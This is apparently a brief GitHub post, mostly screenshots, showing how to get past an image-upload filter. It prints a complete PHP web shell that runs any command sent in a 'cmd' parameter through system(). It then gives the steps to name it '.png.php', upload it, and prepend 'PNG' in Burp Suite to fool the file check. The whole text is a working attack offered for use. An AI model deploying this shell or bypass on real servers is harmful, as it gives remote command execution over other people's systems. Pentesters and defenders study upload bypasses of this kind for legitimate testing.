![image](https://github.com/user-attachments/assets/754886a5-3137-4d14-8771-a5b589b05f92)
![image](https://github.com/user-attachments/assets/90ac8868-62a9-429e-bead-af039a362976)

use this code:

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
now you create a new file that has name <yournamefile>.png.php
and then upload

now in your burpsuite ![image](https://github.com/user-attachments/assets/d2938bb8-ced7-4d92-aad4-94593c8ebfde)

add "PNG"
![image](https://github.com/user-attachments/assets/02f215e4-e4c9-4a50-97f1-765a762b2b60)
![image](https://github.com/user-attachments/assets/90295bc5-c35c-4884-92c5-a1767473178b)

